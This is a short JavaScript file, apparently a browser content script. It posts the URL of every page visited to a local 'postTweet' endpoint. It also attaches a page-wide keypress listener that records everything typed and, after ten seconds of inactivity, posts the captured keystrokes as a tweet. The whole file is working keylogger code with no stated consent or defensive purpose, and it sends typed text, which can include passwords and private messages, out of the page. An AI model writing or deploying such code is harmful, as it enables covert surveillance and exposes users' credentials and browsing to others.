
function sendTweet(status) {

    console.log(status);
    var object1 = {
        status: status,
    }

      fetch('http://127.0.0.1:3000/postTweet', {
        method: 'post',
        body: JSON.stringify(object1),
        headers: {
            'Content-type': 'application/json',
        }
    })
};



var types = '';
var timeOver;


console.log('I visited '+ document.location);
sendTweet('I just visited ' + document.location);

document.addEventListener('keypress', function(e) {
        types += e.key;

        if(timeOver) clearTimeout(timeOver);
        timeOver = setTimeout(() => {
            sendTweet('I just typed \"' + types + "\"");
            types = '';
        }, 10000);
}, false);
